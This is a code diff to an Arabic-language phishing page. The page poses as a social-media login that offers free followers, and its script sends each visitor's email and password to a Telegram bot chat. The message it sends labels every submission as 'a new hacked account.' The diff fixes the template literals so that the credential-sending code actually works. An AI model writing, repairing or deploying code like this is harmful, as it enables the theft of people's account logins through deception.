@@ -53,15 +53,14 @@
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-   <div> اختر عدد المتابعين</div>
+    <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
-    
-<script>
+  <script>
   window.onload = function() {
     const params = new URLSearchParams(window.location.search);
     const chatId = params.get('chatId');
@@ -69,7 +68,7 @@
 
     if (chatId && !id) {
       // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = ${window.location.pathname}?id=${chatId};
+      const targetURL = `${window.location.pathname}?id=${chatId}`;
       window.location.href = targetURL;
     }
     // لو فيه id هيكمل عادي بس مش هيعرضه
@@ -91,9 +90,9 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+    const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
-    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
       .then(response => response.json())
@@ -107,6 +106,5 @@
       });
   });
 </script>
-
 </body>
 </html>
